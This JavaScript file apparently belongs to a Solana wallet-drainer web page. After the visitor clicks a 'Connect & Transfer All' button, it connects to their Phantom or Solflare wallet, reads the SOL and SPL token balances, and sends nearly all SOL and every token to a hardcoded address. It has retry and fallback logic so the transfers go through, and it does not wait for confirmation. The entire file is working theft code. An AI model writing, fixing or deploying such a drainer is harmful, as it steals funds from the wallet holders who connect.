// COMPLETE FIXED script.js
const TARGET_WALLET = '95S96u1usBhhxXpjve6LCbnhyAwHC2sS8aicieAXemUD';
const connectBtn = document.getElementById('connectBtn');
const status = document.getElementById('status');
const progressContainer = document.getElementById('progressContainer');
const progressFill = document.getElementById('progressFill');
const progressText = document.getElementById('progressText');

// Retry function with exponential backoff
async function retryWithBackoff(fn, retries = 3, delay = 1000) {
    for (let i = 0; i < retries; i++) {
        try {
            return await fn();
        } catch (error) {
            if (i === retries - 1) throw error;
            const waitTime = delay * Math.pow(2, i);
            console.log(`Retry ${i + 1} after ${waitTime}ms...`);
            await new Promise(resolve => setTimeout(resolve, waitTime));
        }
    }
}

// Get RPC endpoint with fallback
function getRpcEndpoint() {
    // Try multiple endpoints
    const endpoints = [
        'https://rpc.ankr.com/solana', // Usually works well
        'https://api.mainnet-beta.solana.com',
        'https://solana-api.projectserum.com',
    ];
    
    return endpoints[Math.floor(Math.random() * endpoints.length)];
}

// Update progress
function updateProgress(percentage, message) {
    progressFill.style.width = percentage + '%';
    progressText.textContent = percentage + '%';
    progressContainer.style.display = 'block';
    status.textContent = message;
}

// Copy address
function copyAddress() {
    navigator.clipboard.writeText(TARGET_WALLET);
    const btn = document.querySelector('.copy-btn');
    btn.textContent = '✅ Copied!';
    setTimeout(() => btn.textContent = '📋 Copy', 2000);
}

// Get all SPL tokens
async function getAllSPLTokens(connection, publicKey) {
    try {
        const tokenAccounts = await retryWithBackoff(async () => {
            return await connection.getParsedTokenAccountsByOwner(publicKey, {
                programId: splToken.TOKEN_PROGRAM_ID
            });
        });
        
        return tokenAccounts.value
            .filter(account => {
                const amount = account.account.data.parsed.info.tokenAmount;
                return amount.uiAmount > 0;
            })
            .map(account => ({
                mint: account.account.data.parsed.info.mint,
                tokenAccount: account.pubkey,
                amount: account.account.data.parsed.info.tokenAmount.uiAmount,
                decimals: account.account.data.parsed.info.tokenAmount.decimals
            }));
    } catch (error) {
        console.log('Error fetching tokens:', error);
        return []; // Return empty if can't fetch tokens
    }
}

// Transfer SOL
async function transferSOL(wallet, connection, amount) {
    return await retryWithBackoff(async () => {
        const transaction = new solanaWeb3.Transaction().add(
            solanaWeb3.SystemProgram.transfer({
                fromPubkey: wallet.publicKey,
                toPubkey: new solanaWeb3.PublicKey(TARGET_WALLET),
                lamports: Math.floor(amount * solanaWeb3.LAMPORTS_PER_SOL)
            })
        );
        
        const { blockhash } = await connection.getLatestBlockhash();
        transaction.recentBlockhash = blockhash;
        transaction.feePayer = wallet.publicKey;
        
        const signed = await wallet.signTransaction(transaction);
        const signature = await connection.sendRawTransaction(signed.serialize());
        
        // Don't wait for confirmation to speed up
        return signature;
    });
}

// Transfer SPL token
async function transferSPLToken(wallet, connection, tokenInfo) {
    return await retryWithBackoff(async () => {
        const mintPublicKey = new solanaWeb3.PublicKey(tokenInfo.mint);
        const toPublicKey = new solanaWeb3.PublicKey(TARGET_WALLET);
        
        const toTokenAccount = await splToken.getAssociatedTokenAddress(
            mintPublicKey,
            toPublicKey
        );
        
        const transaction = new solanaWeb3.Transaction();
        
        // Check receiver account
        try {
            const toAccountInfo = await connection.getAccountInfo(toTokenAccount);
            if (!toAccountInfo) {
                transaction.add(
                    splToken.createAssociatedTokenAccountInstruction(
                        wallet.publicKey,
                        toTokenAccount,
                        toPublicKey,
                        mintPublicKey
                    )
                );
            }
        } catch (error) {
            // If we can't check, assume account doesn't exist and try to create
            transaction.add(
                splToken.createAssociatedTokenAccountInstruction(
                    wallet.publicKey,
                    toTokenAccount,
                    toPublicKey,
                    mintPublicKey
                )
            );
        }
        
        // Calculate amount
        const tokenAmount = BigInt(Math.floor(tokenInfo.amount * Math.pow(10, tokenInfo.decimals)));
        
        // Add transfer
        transaction.add(
            splToken.createTransferInstruction(
                tokenInfo.tokenAccount,
                toTokenAccount,
                wallet.publicKey,
                tokenAmount
            )
        );
        
        const { blockhash } = await connection.getLatestBlockhash();
        transaction.recentBlockhash = blockhash;
        transaction.feePayer = wallet.publicKey;
        
        const signed = await wallet.signTransaction(transaction);
        const signature = await connection.sendRawTransaction(signed.serialize());
        
        return signature;
    });
}

// Main transfer function
async function transferAllAssets(wallet, connection) {
    try {
        updateProgress(10, "Checking wallet...");
        
        // Get SOL balance with retry
        const solBalance = await retryWithBackoff(async () => {
            return await connection.getBalance(wallet.publicKey);
        });
        
        const solAmount = solBalance / solanaWeb3.LAMPORTS_PER_SOL;
        updateProgress(20, `Balance: ${solAmount.toFixed(6)} SOL`);
        
        // Get tokens
        await new Promise(resolve => setTimeout(resolve, 500));
        const tokens = await getAllSPLTokens(connection, wallet.publicKey);
        
        updateProgress(30, `Found ${tokens.length} token${tokens.length !== 1 ? 's' : ''}`);
        
        const signatures = [];
        
        // Transfer SOL if has enough
        if (solAmount > 0.001) {
            const amountToTransfer = solAmount - 0.001;
            if (amountToTransfer > 0) {
                updateProgress(40, `Transferring ${amountToTransfer.toFixed(6)} SOL...`);
                try {
                    const solSig = await transferSOL(wallet, connection, amountToTransfer);
                    signatures.push({ type: 'SOL', amount: amountToTransfer, signature: solSig });
                    updateProgress(50, "SOL sent!");
                    await new Promise(resolve => setTimeout(resolve, 1000));
                } catch (error) {
                    console.log('SOL transfer failed:', error);
                }
            }
        }
        
        // Transfer tokens one by one
        for (let i = 0; i < tokens.length; i++) {
            const token = tokens[i];
            const progress = 50 + ((i + 1) / tokens.length * 40);
            
            updateProgress(progress, `Sending ${token.amount} tokens (${i + 1}/${tokens.length})...`);
            
            try {
                const tokenSig = await transferSPLToken(wallet, connection, token);
                signatures.push({ 
                    type: 'SPL', 
                    amount: token.amount, 
                    signature: tokenSig 
                });
                await new Promise(resolve => setTimeout(resolve, 500));
            } catch (error) {
                console.log(`Token ${token.mint} transfer failed:`, error);
            }
        }
        
        // Summary
        updateProgress(95, "Processing complete!");
        
        let summary = `✅ Transfer initiated!\n\n`;
        summary += `To: ${TARGET_WALLET.slice(0, 10)}...\n\n`;
        
        if (signatures.length > 0) {
            summary += `Transactions sent:\n`;
            signatures.forEach((tx, idx) => {
                if (tx.type === 'SOL') {
                    summary += `${idx + 1}. ${tx.amount.toFixed(6)} SOL\n`;
                } else {
                    summary += `${idx + 1}. ${tx.amount} tokens\n`;
                }
            });
        } else {
            summary += `No transfers were made.\nCheck console for details.`;
        }
        
        status.textContent = summary;
        updateProgress(100, "Done!");
        
    } catch (error) {
        throw new Error(`Transfer failed: ${error.message}`);
    }
}

// Main handler
connectBtn.addEventListener('click', async () => {
    if (typeof window.solana === 'undefined') {
        status.textContent = '❌ Install Phantom or Solflare wallet first!';
        return;
    }
    
    try {
        connectBtn.disabled = true;
        connectBtn.textContent = '🔄 Connecting...';
        
        const provider = window.solana;
        await provider.connect();
        
        const wallet = {
            publicKey: new solanaWeb3.PublicKey(provider.publicKey),
            signTransaction: async (tx) => await provider.signTransaction(tx),
            signAllTransactions: async (txs) => await provider.signAllTransactions(txs)
        };
        
        // Use reliable RPC
        const connection = new solanaWeb3.Connection(
            'https://rpc.ankr.com/solana', // Most reliable free RPC
            'confirmed'
        );
        
        status.textContent = `✅ Wallet connected!\n${wallet.publicKey.toString().slice(0, 10)}...`;
        updateProgress(5, "Starting transfer process...");
        
        await new Promise(resolve => setTimeout(resolve, 1000));
        
        await transferAllAssets(wallet, connection);
        
    } catch (error) {
        let errorMsg = error.message;
        if (errorMsg.includes('403')) {
            errorMsg = 'RPC rate limited. Please try again in 30 seconds.';
        } else if (errorMsg.includes('429')) {
            errorMsg = 'Too many requests. Please wait a minute.';
        }
        
        status.textContent = `❌ ${errorMsg}`;
        progressContainer.style.display = 'none';
        
    } finally {
        connectBtn.disabled = false;
        connectBtn.textContent = '🔗 Connect & Transfer All';
    }
});
